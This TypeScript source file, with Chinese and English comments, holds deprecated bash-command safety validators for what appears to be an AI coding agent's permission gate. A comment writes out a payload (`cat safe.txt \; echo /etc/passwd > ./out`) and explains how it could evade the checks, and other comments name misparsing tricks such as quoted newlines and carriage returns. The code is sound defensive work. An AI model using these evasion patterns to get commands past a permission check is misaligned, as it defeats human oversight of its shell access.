export function bashCommandIsSafe_DEPRECATED(command: string): PermissionResult {
  // 安全：在任何其他处理前阻止控制字符。Bash 会静默丢弃 null 字节和其他不可打印字符，
  // 但它们会干扰 validator，使相邻元字符滑过检查。
  if (CONTROL_CHAR_RE.test(command)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.CONTROL_CHARACTERS,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.controlCharacters'),
      isBashSecurityCheckForMisparsing: true,
    }
  }

  // 安全：检测利用 shell-quote 错误处理单引号内反斜杠的 '\' 模式。
  // 必须在 shell-quote 解析前运行。
  if (hasShellQuoteSingleQuoteBug(command)) {
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.singleQuotedBackslash'),
      isBashSecurityCheckForMisparsing: true,
    }
  }

  // 安全：运行安全 validator 前移除 heredoc body。
  // 仅移除使用引号/转义定界符（<<'EOF'、<<\EOF）的 body，此时 body 是字面文本，
  // $()、反引号和 ${} 都不会展开。未引用 heredoc（<<EOF）会执行完整 shell 展开，
  // body 可能包含 validator 必须看到的可执行命令替换。
  // extractHeredocs 无法安全解析而退出时，原始命令会经过所有 validator，这是安全的方向。
  const { processedCommand } = extractHeredocs(command, { quotedOnly: true })

  const baseCommand = command.split(' ')[0] || ''
  const { withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars } = extractQuotedContent(
    processedCommand,
    baseCommand === 'jq',
  )

  const context: ValidationContext = {
    originalCommand: command,
    baseCommand,
    unquotedContent: withDoubleQuotes,
    fullyUnquotedContent: stripSafeRedirections(fullyUnquoted),
    fullyUnquotedPreStrip: fullyUnquoted,
    unquotedKeepQuoteChars,
  }

  const earlyValidators = [
    validateEmpty,
    validateIncompleteCommands,
    validateSafeCommandSubstitution,
    validateGitCommit,
  ]

  for (const validator of earlyValidators) {
    const result = validator(context)
    if (result.behavior === 'allow') {
      return {
        behavior: 'passthrough',
        message:
          result.decisionReason?.type === 'other' || result.decisionReason?.type === 'safetyCheck'
            ? result.decisionReason.reason
            : 'Command allowed',
      }
    }
    if (result.behavior !== 'passthrough') {
      return result.behavior === 'ask'
        ? { ...result, isBashSecurityCheckForMisparsing: true as const }
        : result
    }
  }

  // 不设置 isBashSecurityCheckForMisparsing 的 validator：其 ask 结果会进入标准 permission 流程，
  // 而非被提前阻止。LF 换行和重定向是 splitCommand 可正确处理的常规模式，
  // 不属于误解析风险。
  //
  // NOTE: validateCarriageReturn is NOT here — CR IS a misparsing concern.
  // shell-quote's `[^\s]` treats CR as a word separator (JS `\s` ⊃ \r), but
  // bash IFS does NOT include CR. splitCommand collapses CR→space, which IS
  // misparsing. See validateCarriageReturn for the full attack trace.
  const nonMisparsingValidators = new Set([validateNewlines, validateRedirections])

  const validators = [
    validateJqCommand,
    validateObfuscatedFlagsWithIds,
    validateShellMetacharacters,
    validateDangerousVariables,
    // 在 validateNewlines 之前运行 comment-quote-desync，
    // 用于检测引号 tracker 因 # 注释失步而遗漏换行的情况。
    validateCommentQuoteDesyncWithIds,
    // 在 validateNewlines 之前运行 quoted-newline，用于检测相反情况：
    // 引号内的换行，这是 validateNewlines 刻意忽略的。攻击者可利用已引用换行跨行拆分命令，
    // 使基于行的 stripCommentLines 处理丢弃敏感内容。
    validateQuotedNewlineWithIds,
    // CR 检查在 validateNewlines 之前运行：CR 存在误解析风险
    //（shell-quote/bash tokenization 差异），LF 则没有。
    validateCarriageReturn,
    validateNewlines,
    validateIFSInjection,
    validateProcEnvironAccess,
    validateDangerousPatterns,
    validateRedirections,
    validateBackslashEscapedWhitespaceWithIds,
    validateBackslashEscapedOperatorsWithIds,
    validateUnicodeWhitespaceWithIds,
    validateMidWordHashWithIds,
    validateBraceExpansionWithIds,
    validateZshDangerousCommandsWithIds,
    // 最后运行异常 token 检查；其他 validator 应先捕获具体模式，
    // 因为它们能提供更准确的错误消息。
    validateMalformedTokenInjection,
  ]

  // 安全：如果列表后方仍有误解析 validator，
  // 则非误解析 validator 返回 'ask' 时不得短路。
  // Non-misparsing ask results are discarded at bashPermissions.ts:~1301-1303
  // (the gate only blocks when isBashSecurityCheckForMisparsing is set). If
  // validateRedirections (index 10, non-misparsing) fires first on `>`, it
  // returns ask-without-flag — but validateBackslashEscapedOperators (index 12,
  // misparsing) would have caught `\;` WITH the flag. Short-circuiting lets a
  // payload like `cat safe.txt \; echo /etc/passwd > ./out` slip through.
  //
  // 修复：延迟非误解析 ask 结果，继续运行 validator。
  // 任一误解析 validator 触发时，返回其带 flag 的结果。
  // 仅在到达末尾仍无误解析 ask 时，才返回延迟的非误解析 ask。
  let deferredNonMisparsingResult: PermissionResult | null = null
  for (const validator of validators) {
    const result = validator(context)
    if (result.behavior === 'ask') {
      if (nonMisparsingValidators.has(validator)) {
        if (deferredNonMisparsingResult === null) {
          deferredNonMisparsingResult = result
        }
        continue
      }
      return { ...result, isBashSecurityCheckForMisparsing: true as const }
    }
  }
  if (deferredNonMisparsingResult !== null) {
    return deferredNonMisparsingResult
  }

  return {
    behavior: 'passthrough',
    message: tSync('bashSecurity.allChecksPassed'),
  }
}

/**
 * @deprecated Legacy regex/shell-quote path. Only used when tree-sitter is
 * unavailable. The primary gate is parseForSecurity (ast.ts).
 *
 * bashCommandIsSafe 的异步版本，tree-sitter 可用时用它进行更准确的解析；
 * tree-sitter 不可用时回退到同步 regex 版本。
 *
 * 异步调用方（bashPermissions.ts、bashCommandHelpers.ts）应使用此函数。
 * 同步调用方（readOnlyValidation.ts）应继续使用 bashCommandIsSafe()。
 */
export async function bashCommandIsSafeAsync_DEPRECATED(
  command: string,
  onDivergence?: () => void,
): Promise<PermissionResult> {
  // 尝试获取 tree-sitter 分析
  const parsed = await ParsedCommand.parse(command)
  const tsAnalysis = parsed?.getTreeSitterAnalysis() ?? null

  // tree-sitter 不可用时回退到同步版本
  if (!tsAnalysis) {
    return bashCommandIsSafe_DEPRECATED(command)
  }

  // Run the same security checks but with tree-sitter enriched context.
  // The early checks (control chars, shell-quote bug) don't benefit from
  // tree-sitter, so we run them identically.
  if (CONTROL_CHAR_RE.test(command)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.CONTROL_CHARACTERS,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.controlCharacters'),
      isBashSecurityCheckForMisparsing: true,
    }
  }

  if (hasShellQuoteSingleQuoteBug(command)) {
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.singleQuotedBackslash'),
      isBashSecurityCheckForMisparsing: true,
    }
  }

  const { processedCommand } = extractHeredocs(command, { quotedOnly: true })

  const baseCommand = command.split(' ')[0] || ''

  // 使用 tree-sitter 引号 context 进行更准确的分析
  const tsQuote = tsAnalysis.quoteContext
  const regexQuote = extractQuotedContent(processedCommand, baseCommand === 'jq')

  // 以 tree-sitter 引号 context 为主，但保留 regex 作为 divergence 日志的参考
  const withDoubleQuotes = tsQuote.withDoubleQuotes
  const fullyUnquoted = tsQuote.fullyUnquoted
  const unquotedKeepQuoteChars = tsQuote.unquotedKeepQuoteChars

  const context: ValidationContext = {
    originalCommand: command,
    baseCommand,
    unquotedContent: withDoubleQuotes,
    fullyUnquotedContent: stripSafeRedirections(fullyUnquoted),
    fullyUnquotedPreStrip: fullyUnquoted,
    unquotedKeepQuoteChars,
    treeSitter: tsAnalysis,
  }

  // Log divergence between tree-sitter and regex quote extraction.
  // Skip for heredoc commands: tree-sitter strips (quoted) heredoc bodies
  // to nothing while the regex path replaces them with placeholder strings
  // (via extractHeredocs), so the two outputs can never match. Logging
  // divergence for every heredoc command would poison the signal.
  //
  // onDivergence callback: when called in a fanout loop (bashPermissions.ts
  // Promise.all over subcommands), the caller batches divergences into a
  // single logEvent instead of N separate calls. Each logEvent triggers
  // getEventMetadata() → buildProcessMetrics() → process.memoryUsage() →
  // /proc/self/stat read; with memoized metadata these resolve as microtasks
  // and starve the event loop (CC-643). Single-command callers omit the
  // callback and get the original per-call logEvent behavior.
  if (!tsAnalysis.dangerousPatterns.hasHeredoc) {
    const hasDivergence =
      tsQuote.fullyUnquoted !== regexQuote.fullyUnquoted ||
      tsQuote.withDoubleQuotes !== regexQuote.withDoubleQuotes
    if (hasDivergence) {
      if (onDivergence) {
        onDivergence()
      } else {
        logEvent('zy_tree_sitter_security_divergence', {
          quoteContextDivergence: true,
        })
      }
    }
  }

  const earlyValidators = [
    validateEmpty,
    validateIncompleteCommands,
    validateSafeCommandSubstitution,
    validateGitCommit,
  ]

  for (const validator of earlyValidators) {
    const result = validator(context)
    if (result.behavior === 'allow') {
      return {
        behavior: 'passthrough',
        message:
          result.decisionReason?.type === 'other' || result.decisionReason?.type === 'safetyCheck'
            ? result.decisionReason.reason
            : 'Command allowed',
      }
    }
    if (result.behavior !== 'passthrough') {
      return result.behavior === 'ask'
        ? { ...result, isBashSecurityCheckForMisparsing: true as const }
        : result
    }
  }

  const nonMisparsingValidators = new Set([validateNewlines, validateRedirections])

  const validators = [
    validateJqCommand,
    validateObfuscatedFlagsWithIds,
    validateShellMetacharacters,
    validateDangerousVariables,
    validateCommentQuoteDesyncWithIds,
    validateQuotedNewlineWithIds,
    validateCarriageReturn,
    validateNewlines,
    validateIFSInjection,
    validateProcEnvironAccess,
    validateDangerousPatterns,
    validateRedirections,
    validateBackslashEscapedWhitespaceWithIds,
    validateBackslashEscapedOperatorsWithIds,
    validateUnicodeWhitespaceWithIds,
    validateMidWordHashWithIds,
    validateBraceExpansionWithIds,
    validateZshDangerousCommandsWithIds,
    validateMalformedTokenInjection,
  ]

  let deferredNonMisparsingResult: PermissionResult | null = null
  for (const validator of validators) {
    const result = validator(context)
    if (result.behavior === 'ask') {
      if (nonMisparsingValidators.has(validator)) {
        if (deferredNonMisparsingResult === null) {
          deferredNonMisparsingResult = result
        }
        continue
      }
      return { ...result, isBashSecurityCheckForMisparsing: true as const }
    }
  }
  if (deferredNonMisparsingResult !== null) {
    return deferredNonMisparsingResult
  }

  return {
    behavior: 'passthrough',
    message: tSync('bashSecurity.allChecksPassed'),
  }
}

export { hasSafeHeredocSubstitution, stripSafeHeredocSubstitutions }
